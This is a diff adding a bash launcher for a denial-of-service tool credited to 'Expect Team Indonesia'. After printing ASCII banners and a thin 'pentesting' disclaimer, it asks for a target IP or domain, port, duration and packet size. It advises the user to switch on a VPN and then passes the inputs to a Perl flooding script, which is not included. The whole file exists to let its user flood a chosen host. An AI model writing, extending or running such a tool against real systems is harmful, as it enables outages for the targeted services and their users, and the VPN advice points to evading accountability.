@@ -1,0 +1,104 @@
+
+#Coded by SIIDHAX 
+#Colors
+	red='\033[1;31m'
+	green='\033[1;32m'
+	yellow='\033[1;33m'
+        blue='\033[1;34m'
+	magenta='\033[1;35m'
+        cyan='\033[1;36m'
+        reset='\033[0m'
+clear
+
+#BANNER
+
+printf "$blue"
+	  echo "  	 -{ Denial of Service Attack Tool (DoS-A-Tool)"
+	  echo "	                 -{ Coded by } "
+printf "$red"
+          echo "	==============EXPECT TEAM INDINESIA==============="
+	  echo "	▓█████ ▒██   ██▒ ██▓███  ▓█████  ▄████▄  ▄▄▄█████▓"
+   	  echo "	▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒"
+	  echo "	▒███   ░░  █   ░▓██░ ██▓▒▒███   ▒▓█    ▄ ▒ ▓██░ ▒░"
+	  echo "	▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ "
+	  echo "	░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░▒████▒▒ ▓███▀ ░  ▒██▒ ░ "
+ 	  echo "	░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   "
+	  echo "	 ░ ░  ░░░   ░▒ ░░▒ ░      ░ ░  ░  ░  ▒       ░    "
+	  echo "	   ░    ░    ░  ░░          ░   ░          ░      "
+	  echo "	   ░  ░ ░    ░              ░  ░░ ░               "
+	  echo "	                                ░                 "
+ 	  echo "	==============EXPECT TEAM INDONESIA==============="
+printf "$blue"
+          echo "		   [---] ┌∩┐(◣_◢)┌∩┐ [---]"
+	  echo "	        [-] THENKS FOR ALL MEMBERS [-]"
+	  echo "	        [-] .EXPECT TEAM INDONESIA [-]"
+	  sleep 2
+	  echo
+printf "$red"
+	  echo " 		    [---] DISCLAIMER [---]"
+printf "$reset"
+	  echo "This tool was created for pentesting and computer security tests."
+	  echo "             If the law is violated with its use,"
+	  echo "   this would be the responsibility of the user who handled it"
+printf "$red"
+	  echo "		 [-] Use At Your Own Risk [-]"
+	  echo
+	  sleep 2
+printf "$reset"
+	  echo
+	  while read -p "Set IP or DNS target >> " Target && [ -z $Target ]; do
+		  printf "$red\t\t[W] O-ops!!$reset\n"
+	  done
+	  echo
+	  while read -p "Set your Port >> " Lport && [ -z $Lport ]; do
+                  printf "$red\t\t[W] O-ops!!$reset\n"
+          done
+	  echo
+	  while read -p "Set a sending package time in seconds (0 = unlimited) >> " Time && [ -z $Time ]; do
+                  printf "$red\t\t[W] O-ops!!$reset\n"
+          done
+	  echo
+	  while read -p "Set a size of the package to send (0 = default) >> " Size && [ -z $Size ]; do
+		  printf "$red\t\t[W] O-ops!!$reset\n"
+	  done
+	  echo
+printf "$red"
+	  sleep 1
+	  echo "[w] Don not forget active your VPN"
+	  echo
+printf "$reset"
+          echo "[+] Press ENTER to start or Ctrl+c to shut down"
+          read ENTER
+	  clear
+
+#Banner
+
+clear
+printf "$blue"
+        echo "              . .IIIII             .II"
+        echo "  IIIIIIIIII. I  II  .    II..IIII-Ivam3-IIIIIIIII"
+        echo " .  .IIIIII  II             IIIIIIIIIIIIIIIIIIIII  I."
+        echo "    .IIIII.III I        IIIByIII-II+Cinderella+III"
+        echo "   .IIIIIIII           II  .IIIII IIIIIIIIIIII. I"
+        echo "    IIIIII             IIII I  III+DDoS+IIII I"
+        echo "    .II               IIIIIIIIIIIII  IIIIIIIII"
+        echo "       I.           .II+ATTACK+II    I   II  I"
+        echo "         .IIII        IIIIIIIIIIII     .       I"
+        echo "          IIIII.          IIIIII           . I."
+        echo "         +HACKING+         IIIII             ..I  II ."
+        echo "          IIIIIII          IIII...             IIII"
+        echo "            IIII           III. I            IIQEPDII"
+        echo "            III             I                I  III"
+        echo "            II                                   I   ."
+        echo "             I     EXPECT TEAM by SIIDHAX               "
+	echo "
+	"
+printf "$reset"
+	sleep 1
+printf "$green"
+	echo "[+] Starting a Denial of Service Attack to $Target"
+printf "$reset"
+	sleep 3
+	echo
+
+	perl expect $Target $Lport $Time $Size
